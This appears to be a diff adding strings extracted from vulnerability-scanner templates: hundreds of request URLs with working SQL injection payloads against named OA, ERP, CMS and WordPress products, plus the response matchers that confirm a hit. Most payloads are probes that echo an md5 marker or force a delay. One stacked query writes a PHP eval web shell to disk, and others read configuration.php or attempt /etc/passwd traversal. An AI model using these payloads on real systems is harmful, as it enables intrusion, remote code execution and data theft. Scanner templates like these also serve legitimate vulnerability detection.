+- "{{RootURL}}/api/dp/rptsvcsyncpoint?ccid=1%27%3Bcreate+table+O%28T+TEXT%29%3Binsert+into+O%28T%29+values%28%27%3C%3Fphp+%40eval%28%24_POST%5B1%5D%29%3B%3F%3E%27%29%3Bcopy+O%28T%29+to+%27C%3A%5CProgram+Files+%28x86%29%5C360%5Cskylar6%5Cwww%5C1.php%27%3Bdrop+table+O%3B--++"
+- "{{RootURL}}/api/terminal/clientinfobymid"
+- "{{RootURL}}/c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1"
+- "{{RootURL}}/defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp;?RecordID=1'%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27qaxnb%27))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--"
+- "{{RootURL}}/formservice?service=workflow.sqlResult"
+- "{{RootURL}}/general/approve_center/handle_form.php?FORM_VERSION_ID=1"
+- "{{RootURL}}/general/system/seal_manage/{{path1}}?start="
+- "{{RootURL}}/general/system/seal_manage/{{path2}}?DELETE_STR=1"
+- "{{RootURL}}/jc6/servlet/imagefield"
+- "{{RootURL}}/jc6/servlet/uploaddoc"
+- "{{RootURL}}/qax.php"
+- "{{RootURL}}/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d"
+- "{{RootURL}}/templates/attestation/../../report/report_collect/report_org_collect_tree.jsp"
+- "{{RootURL}}/tplus/tapi/v1/DevVouMsgSetApi/getSendActionByMenu?dsName=UFTData160658_000001&menuCode=ARAP01'"
+- "{{injection}}"
+- "{{md5(num)}}"
+- "{{md5(str)}}"
+- "{{payload}}"
+- "{{prefix}}{{payload}}{{suffix}}"
+- "{{randomstr1}}, "
+- "{{randomstr2}}"
+- "{{randstr}}"
+- "{{result}}"
+- "{{sqli}}"
+- "{{sqloscuridad}}"
+- "||(SELECT '{{randomstr1}}' FROM DUAL WHERE {{randomnum1}}={{randomnum1}} "
+- "||(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+- "~"
+- "引号内的字符串没有正确结束"
+- "您有附件尚未上传，请上传后提交！"
+- "文件服务器配置管理"
+- "没有检测到用户Key"
+- "添加体验账号程序异常，请联系管理员"
+- "错误#1062:"
+- "附近有语法错误"
+- ' contains(body,"1447200000") '
+- ' contains(body,"202cb962ac59075b964b07152d234b70") && status_code==200'
+- '!contains(body,"/index.php?option=com_ebcontent&view=article&id=37%27%20AND%20(SELECT%20*%20FROM%20(SELECT")'
+- '!contains(body,"index.php%3Foption%3Dcom_googlesearch_cse%26n%3D30")'
+- '!contains(body,"index.php?option=com_googlesearch_cse&n=30&Itemid=&cx=0170936873967")'
+- '!contains(body_1,"not have this language") && contains(body_2,"not have this
+- '"home":"(.*?)",'
+- '"img_url":"'
+- '"para":'
+- '"root@'
+- '"status":"1"'
+- '"status":true}'
+- '"td_oa"'
+- '"value":'
+- '#login-form'
+- '%28select%2Afrom%28select%28sleep%287%29%29%29a%29'
+- '%3B%28select%201%20from%20pg%5Fsleep%287%29%29'
+- '%3Bwaitfor%20delay%20%270%3A0%3A7%27%2D%2D'
+- '%7C%7C%28select%201%20from%20pg%5Fsleep%287%29%29'
+- '/wp-content/themes/xhibiter/'
+- '0x{{md5({{num}})}}'
+- '200'
+- '<EOF>'
+- '<title>SQLiteManager</title>'
+- 'Admin Panel'
+- 'Admin user'
+- 'Alumni List'
+- 'CVMS'
+- 'Dashboard'
+- 'Employee Management System'
+- 'GRP-U8'
+- 'JFIF'
+- 'Loan Management System'
+- 'Log Out'
+- 'MySQL server error report:Array'
+- 'PHPSESSID=(.*?);'
+- 'SQL'
+- 'Set-Cookie: (.+?);'
+- 'Set-Cookie: OASESSIONID=([A-F0-9]+);'
+- 'Stable tag\: [1][3]\.[0].([1]|[2]|[3]|[4]|[5]|[6]|[7])|[1][3]\.[0]$'
+- 'WP Statistics'
+- 'Welcome back Admin!'
+- 'Welcome back Admin'
+- 'XPATH syntax error: ''~'
+- 'XPATH syntax error:'
+- 'ZMS ADMIN'
+- 'Zoo Management System'
+- '[0] => Array'
+- '[error] =>'
+- 'album_not_exist'
+- 'application/json'
+- 'attribute_counts'
+- 'c8c605999f3d8352d7bb792cf3fdb25'
+- 'col'
+- 'contains(body, "/cpasm4/mobileQRCodeController/")'
+- 'contains(body, "43f845fa0c8aef9104f8e1b07625ecf8")'
+- 'contains(body, "65025")'
+- 'contains(body, "CSZ CMS")'
+- 'contains(body, "Nabb</title>")'
+- 'contains(body, "There is no notification created with this id")'
+- 'contains(body, "You have an error in your SQL syntax") && contains(body, "manufacturers_id") && contains(body, "products_price")'
+- 'contains(body, "abc-result-header")'
+- 'contains(body, "account you entered")'
+- 'contains(body, "applezeed")'
+- 'contains(body, "module-apmarketplace-passwordrecovery")'
+- 'contains(body, "{\"success\":true}")'
+- 'contains(body,"All members")'
+- 'contains(body,"OK")'
+- 'contains(body,"\"SealData\":\"1\"") && status_code == 200'
+- 'contains(body,"elgg.js")'
+- 'contains(body,"qqqzq1qvkqq")'
+- 'contains(body,"qxjpqjwUIWcKtHqhkYslITEIKSbtxYTRxTtXpWImhWfaMqvjzq")'
+- 'contains(body,"操作成功")'
+- 'contains(body_1, "Smart Manager for e-Commerce")'
+- 'contains(body_1,"CustomInfo") && contains(header_1,"PHPSESSID")'
+- 'contains(body_2, "You have an error in your SQL syntax") && contains(body_1, "Phuket Solution")'
+- 'contains(body_2, "rel=\"preconnect") || contains(body, "Error</title>")'
+- 'contains(body_2, "{{randstr}}")'
+- 'contains(body_2,"src=\"custom/")'
+- 'contains(code_2_response, "root")'
+- 'contains(code_3_response, "root")'
+- 'contains(content_type, "application/json")'
+- 'contains(content_type, "text/html")'
+- 'contains(content_type, "text/plain")'
+- 'contains(content_type, "text/xml")'
+- 'contains(content_type,"text/html")'
+- 'contains(content_type,"text/xml")'
+- 'contains(content_type_2, "text/html")'
+- 'contains(content_type_2, "text/plain")'
+- 'contains(header, "OCSESSID=")'
+- 'contains(header, "PmbOpac")'
+- 'contains(header, "PrestaShop")'
+- 'contains(header, "text/html")'
+- 'contains(header, "text/xml")'
+- 'contains(header,"text/xml")'
+- 'contains(header_1, "ecology_JSessionid=")'
+- 'contains(header_2, "ecology_JSessionid=")'
+- 'contains(response, "孚盟")'
+- 'contains(tolower(body), "yonyou")'
+- 'contains_all(body, "<list>" ,"<string>user()" ,"<length>")'
+- 'contains_all(body, "A Database Error Occurred", "{{md5({{num}})}}")'
+- 'contains_all(body, "iSignature", "DoYFSignature")'
+- 'contains_all(body, "id", "name", "save_lists.php")'
+- 'contains_all(body, "user_login_id", "Products</a>")'
+- 'contains_all(body, "在将 nvarchar 值", "转换成数据类型 int 时失败")'
+- 'contains_all(body,"<buffalo-reply>" ,"<string>user()")'
+- 'contains_all(body,"Result","false","Message")'
+- 'contains_all(body,"TreeNode id=\"hongjing","SQL Server")'
+- 'contains_all(body,"TreeNode","tab_id")'
+- 'contains_all(response_1, "SELECT count", "System.Exception:", "WHERE upper")'
+- 'contains_any(body, "opencart.com", "OpenCart is open source", "content=\"OpenCart")'
+- 'contains_any(header, "bb_lastvisit", "bb_sessionhash")'
+- 'contains_any(header, "text/html", "text/plain")'
+- 'data":"{{md5({{num}})}}'
+- 'duration >= 6'
+- 'duration>=10'
+- 'duration>=29'
+- 'duration>=4 && duration<=7'
+- 'duration>=4'
+- 'duration>=5'
+- 'duration>=6'
+- 'duration>=7 && duration<=8'
+- 'duration>=7'
+- 'duration>=9'
+- 'duration_1>=6'
+- 'duration_1>=7 && status_code_1 == 200'
+- 'duration_2>=15 && status_code_2 == 200'
+- 'duration_2>=4 && duration_2<=7'
+- 'duration_2>=6'
+- 'duration_2>=7'
+- 'insert into'
+- 'lastOperateTime'
+- 'lastOperatorName'
+- 'len(body_2) == 1'
+- 'login-form'
+- 'method != "OPTIONS"'
+- 'order by begintime'
+- 'pq: invalid input syntax for type integer: \"PostgreSQL '
+- 'price_range'
+- 'receiveTime'
+- 'regex("^0$", body_2)'
+- 'regex(''Location: (.*)'',all_headers_1) != regex(''Location: (.*)'',all_headers_2)'
+- 'report?{{string}}&n=1147'
+- 'select%201%20from%20pg%5Fsleep%287%29'
+- 'share_id='
+- 'sqli-test'
+- 'status_code == 200'
+- 'status_code == 401'
+- 'status_code == 500'
+- 'status_code==200 && contains(body,"~~~202cb962ac59075b964b07152d234b70~~~") '
+- 'status_code==200'
+- 'status_code==500'
+- 'status_code_1 == 500'
+- 'status_code_1==200 && status_code_2==200 && body_1!=body_2 '
+- 'status_code_1==200 && status_code_2==200 && status_code_3==200 '
+- 'status_code_1==200 && status_code_2==200 '
+- 'status_code_2 == 200'
+- 'status_code_2 == 500'
+- 'status_code_2==200 && status_code_3==200 '
+- 'target'
+- 'term'
+- 'window.start_load'
+- '{"123":"123"}'
+- '{"api_status":'
+- '{{BaseURL}}"'
+- '{{BaseURL}}/3g/menu.php?uid=1%20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(md5(1))%20from%20Admin%20limit%201)))'
+- '{{BaseURL}}/404.php?key=1%27or%20updatexml(1,(select%20md5(123)),1)%23'
+- '{{BaseURL}}/?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1%20union%20all%20select%20MD5(123),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#'
+- '{{BaseURL}}/?brand=%27and%28select%201%20from%28select%20count%28%2a%29%2Cconcat%280x7e%2C%28select%20concat%28md5%28123%29%29%20from%20information_schema.tables%20limit%200%2C1%29%2Cfloor%28rand%280%29%2a2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29and%27&s=list'
+- '{{BaseURL}}/?deid=%27and%28select%201%20from%28select%20count%28%2a%29%2Cconcat%280x7e%2C%28select%20concat%28md5%28123%29%29%20from%20information_schema.tables%20limit%200%2C1%29%2Cfloor%28rand%280%29%2a2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29and%27&s=admin_buyorder'
+- '{{BaseURL}}/?firstRow=0&key=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27M&m=product&orderby=3&s=list&totalRows=0'
+- '{{BaseURL}}/?id=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27%23&s=admin_receipt'
+- '{{BaseURL}}/?id=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27%23&s=admin_return'
+- '{{BaseURL}}/?id=%27and%28select%201%20from%28select%20count%28%2a%29%2Cconcat%280x7e%2C%28select%20concat%28md5%28123%29%29%20from%20information_schema.tables%20limit%200%2C1%29%2Cfloor%28rand%280%29%2a2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29and%27&s=match'
+- '{{BaseURL}}/?key=%27and%28select%201%20from%28select%20count%28%2a%29%2Cconcat%280x7e%2C%28select%20concat%28md5%28123%29%29%20from%20information_schema.tables%20limit%200%2C1%29%2Cfloor%28rand%280%29%2a2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29and%27&s=list'
+- '{{BaseURL}}/?m=activity&s=admin_activity_product_list&id=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27%23'
+- '{{BaseURL}}/?m=adv&s=admin/adv'
+- '{{BaseURL}}/?m=announcement&s=admin/announcement&delid=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=announcement&s=admin/announcement'
+- '{{BaseURL}}/?m=announcement&s=detail&id=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=brand&s=admin/add_brand_user&id=1%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=brand&s=admin/brand&delid=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=brand&s=admin/brand_cat&delid=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=brand&s=admin/brand_cat&id=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=logistics&s=admin/fast_mail&id=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=logistics&s=admin_logistics_temp&deid=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=logistics&s=admin_logistics_temp&edit=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=logistics&s=admin_start_addr&delid=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=logistics&s=admin_start_addr&fid=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=logistics&s=admin_start_addr&id=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=logistics&s=admin_start_addr&tid=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=member&s=admin/delivery_address&delid=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=member&s=admin/feedback&step=del&id=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=member&s=admin/feedbackd&deid=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=member&s=admin/feedbackd&id=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=member&s=admin/membermod&userid=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=member&s=admin/reserve_username&action=delone&delid=1%20and%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29'
+- '{{BaseURL}}/?m=member&s=admin/user_read_rec&username=1%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27'
+- '{{BaseURL}}/?m=member&s=admin_member&editid=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=member&s=admin_security&editid=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=message&s=admin/hy_feedback&key=1%27%20and%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29--%20-'
+- '{{BaseURL}}/?m=message&s=admin_message_det&id=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?m=message&s=admin_message_list_delbox&did=1%27%20AND%20%28SELECT%20%2a%20FROM%20%28SELECT%28SLEEP%2810%29%29%29a%29--%20-'
+- '{{BaseURL}}/?m=message&s=admin_message_list_delbox&rid=1%20AND%20%28SELECT%20%2a%20FROM%20%28SELECT%28SLEEP%288%29%29%29a%29--%20-'
+- '{{BaseURL}}/?m=message&s=admin_message_list_delbox&rid=1%20and%20EXP(~(select%20*%20from%20(select%20md5(3.14))a))'
+- '{{BaseURL}}/?m=message&s=admin_message_list_inbox&did=1%27%20AND%20%28SELECT%20%2a%20FROM%20%28SELECT%28SLEEP%288%29%29%29a%29--%20-'
+- '{{BaseURL}}/?m=message&s=admin_message_sed&uid=%27or%20updatexml(1,(select%20md5(123)),1)%23'
+- '{{BaseURL}}/?m=message&s=admin_message_sed&uid=1%27%20and%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29--%20-'
+- '{{BaseURL}}/?m=payment&s=admin/bank_account&deid=%27%20and%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29--%20-'
+- '{{BaseURL}}/?m=payment&s=admin/bank_account_mod'
+- '{{BaseURL}}/?m=payment&s=admin/brand&delid=1%27%20and%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20and%27'
+- '{{BaseURL}}/?m=payment&s=admin/brand'
+- '{{BaseURL}}/?m=payment&s=admin/cards&delid=%27%20and%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20and%27'
+- '{{BaseURL}}/?m=payment&s=admin/cards'
+- '{{BaseURL}}/?m=payment&s=admin/service_fee'
+- '{{BaseURL}}/?m=payment&s=admin/withdraw&operation=edit'
+- '{{BaseURL}}/?m=points&s=admin/points'
+- '{{BaseURL}}/?m=points&s=admin/points_cat&delid=%27or%20updatexml(1,(select%20md5(123)),1)%23'
+- '{{BaseURL}}/?m=product&s=admin/cpmod&id=%27or%20updatexml(1,(select%20md5(123)),1)%23'
+- '{{BaseURL}}/?m=product&s=admin/cpmod'
+- '{{BaseURL}}/?m=product&s=admin/list&type=%27or%20updatexml(1,(select%20md5(123)),1)%23&id=1'
+- '{{BaseURL}}/?m=product&s=admin/order_detail&oid=1%20or%20updatexml(1,(select%20md5(123)),1)%23&id=1'
+- '{{BaseURL}}/?m=product&s=admin/order_detail&oid=updatexml(1,concat(0x5c,md5(3.14)),1)'
+- '{{BaseURL}}/?m=product&s=admin/property'
+- '{{BaseURL}}/?m=product&s=admin/spec'
+- '{{BaseURL}}/?m=product&s=admin/user_order&deid=1&username=1%27%20or%20updatexml(1,(select%20md5(123)),1)%23&id=1'
+- '{{BaseURL}}/?m=product&s=admin_product_count&id=%27or%20updatexml(1,(select%20md5(123)),1)%23'
+- '{{BaseURL}}/?m=product&s=admin_shop_consult&type=add&&id=%27or%20updatexml(1,(select%20md5(123)),1)%23'
+- '{{BaseURL}}/?m=product&s=comment&id=%27or%20updatexml(1,(select%20md5(123)),1)%23&uid=1'
+- '{{BaseURL}}/?m=product&s=list&key=%27%20and%201=updateXml%281,concat%280x5c,md5%283.14%29%29,1%29%23'
+- '{{BaseURL}}/?m=product&s=list&ptype=0%27%20%20and%201=updatexml%281,concat%280x5c,md5%283.14%29%29,1%29%23'
+- '{{BaseURL}}/?m=product&s=ucomment&id=%27or%20updatexml(1,(select%20md5(123)),1)%23&uid=1'
+- '{{BaseURL}}/?m=report&s=admin/report'
+- '{{BaseURL}}/?m=shop&id=&province=%27%20and%201=updatexml%281,concat%280x5c,md5%283.14%29%29,1%29%23'
+- '{{BaseURL}}/?m=shop&s=admin/shipping_address'
+- '{{BaseURL}}/?m=shop&s=admin/shop_cat&delid=%27or%20updatexml(1,(select%20md5(123)),1)%23'
+- '{{BaseURL}}/?m=shop&s=admin/shop_domin'
+- '{{BaseURL}}/?m=shop&s=admin/shop_earnest'
+- '{{BaseURL}}/?m=shop&s=admin/shop_grade'
+- '{{BaseURL}}/?m=shop&s=admin/shop_template'
+- '{{BaseURL}}/?m=sms&s=admin/notice_template&type=1%27%20or%20updatexml(1,(select%20md5(123)),1)%23'
+- '{{BaseURL}}/?m=tg&s=admin/tg_member'
+- '{{BaseURL}}/?orderby=1&s=list&m=product&brand=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27'
+- '{{BaseURL}}/?orderby=1&totalRows=0&m=product&firstRow=0&s=lsit&key=%27%20or%20extractvalue%281%2Cconcat%280x7e%2C%28md5%28123%29%29%29%29%20or%27'
+- '{{BaseURL}}/?orderby=xxx&s=list&m=product&ptype=0&key=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27'
+- '{{BaseURL}}/?s=admin/order_detail&oid=updatexml(1,concat(0x7e,md5(123)),1)'
+- '{{BaseURL}}/?s=consult&id=1&key=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27%23'
+- '{{BaseURL}}/?s=consult&pid=1&k=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27%23'
+- '{{BaseURL}}/?s=list&province=%27and%28select%201%20from%28select%20count%28%2a%29%2Cconcat%280x7e%2C%28select%20concat%28md5%28123%29%29%20from%20information_schema.tables%20limit%200%2C1%29%2Cfloor%28rand%280%29%2a2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29and%27'
+- '{{BaseURL}}/?s=list&ptype=%27and%28select%201%20from%28select%20count%28%2a%29%2Cconcat%280x7e%2C%28select%20concat%28md5%28123%29%29%20from%20information_schema.tables%20limit%200%2C1%29%2Cfloor%28rand%280%29%2a2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29and%27'
+- '{{BaseURL}}/?status=send&id=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27%23&s=admin_deliver'
+- '{{BaseURL}}/?type=add&id=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27%23&s=admin_shop_consult'
+- '{{BaseURL}}/E-mobile/flowimg.php?RUN_ID=1%20AND%20%28SELECT%20%2a%20FROM%20%28SELECT%28SLEEP%285%29%29%29LkEu%29'
+- '{{BaseURL}}/Proxy'
+- '{{BaseURL}}/aboutus.php?type=aa%27%20UNION%20SELECT%201%2C2%2Cmd5%28123%29%2C4%2C5%2C6%2C7%23'
+- '{{BaseURL}}/aboutus.php?type=aa&key=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27'
+- '{{BaseURL}}/acc/bindipmac/static_arp_include.php?ifName=123%27%20order%20by%201--'
+- '{{BaseURL}}/acc/bindipmac/static_arp_include.php?ifName=123%27%20order%20by%202--'
+- '{{BaseURL}}/acc/bindipmac/static_arp_setting_content.php?arpName=123%27%20UNION%20ALL%20SELECT%20NULL,strftime(%27%s%27,%272015-11-11%27),NULL,NULL,NULL,NULL,NULL,NULL--'
+- '{{BaseURL}}/admin/login/login_check.php?langset=cn%27%20and%20%271%27%20%3D%271'
+- '{{BaseURL}}/admin/login/login_check.php?langset=cn%27%20and%20%271%27%20%3D%272'
+- '{{BaseURL}}/admin/login/login_check.php?met_cookie_filter[a]=a%27+where+(select+sleep(5))=1;+%23--'
+- '{{BaseURL}}/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes'
+- '{{BaseURL}}/ajax_back_end.php?user=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27'
+- '{{BaseURL}}/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{num}}))) --+'
+- '{{BaseURL}}/api/ad.php?catid=&id=1&name=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27'
+- '{{BaseURL}}/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1'
+- '{{BaseURL}}/batch.common.php?action=modelquote&cid=1&name=spacecomments,(SELECT%203284%20FROM(SELECT%20COUNT(*),CONCAT(CHAR(58,105,99,104,58),(MID((IFNULL(CAST(md5(1)%20AS%20CHAR),CHAR(32))),1,50)),CHAR(58,107,111,117,58),FLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)'
+- '{{BaseURL}}/cat.php?key=1%27or%20updatexml(1,(select%20md5(123)),1)%23'
+- '{{BaseURL}}/cms/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1'
+- '{{BaseURL}}/defaultroot/DossierBorrowAction.do?action=load&record=1'
+- '{{BaseURL}}/defaultroot/DossierBorrowAction.do?action=load&record=1;WAITFOR DELAY+"0:0:5"--+-'
+- '{{BaseURL}}/defaultroot/GovDocumentDossierAction.do?flag=sendFile&id=1'
+- '{{BaseURL}}/defaultroot/GovDocumentDossierAction.do?flag=sendFile&id=1;WAITFOR+DELAY+''0:0:5''--+-'
+- '{{BaseURL}}/defaultroot/GovSendFileAction.do?action=listLoad&editId=2%20AND%209847%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2871%29%7C%7CCHR%28114%29%7C%7CCHR%28114%29%7C%7CCHR%2871%29%2C5%29'
+- '{{BaseURL}}/defaultroot/GovSendFileAction.do?action=listLoad&editId=2'
+- '{{BaseURL}}/defaultroot/NameCardAction.do?action=delperson&delId=1%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--'
+- '{{BaseURL}}/defaultroot/NameCardAction.do?action=delperson&delId=1'
+- '{{BaseURL}}/defaultroot/outMailLoginCheck.jsp?userAccount=&outMailRandom=''%20OR%205754%3DDBMS_PIPE.RECEIVE_MESSAGE(CHR(79)%7C%7CCHR(66)%7C%7CCHR(100)%7C%7CCHR(90)%2C5)%20AND%20''a''%3D''a'
+- '{{BaseURL}}/defaultroot/outMailLoginCheck.jsp?userAccount=&outMailRandom=1'
+- '{{BaseURL}}/document/file_publish_open.jsp?id=1%29%20AND%201387%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%2875%29%7C%7CCHR%2886%29%7C%7CCHR%28116%29%2C5%29--'
+- '{{BaseURL}}/forummission.php?index=show&id=24%20and+1=2+union+select+1,2,md5(1),4,5,6,7,8,9,10,11--'
+- '{{BaseURL}}/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and IF(1=1, SLEEP(5), 0) and (1)=(1)'
+- '{{BaseURL}}/hrss/attach.download.d?appName=PSNBASDOC_RM&pkAttach=null&Ojtt%3D8516%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2C2%2C3%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%20..%2F..%2F..%2Fetc%2Fpasswd'
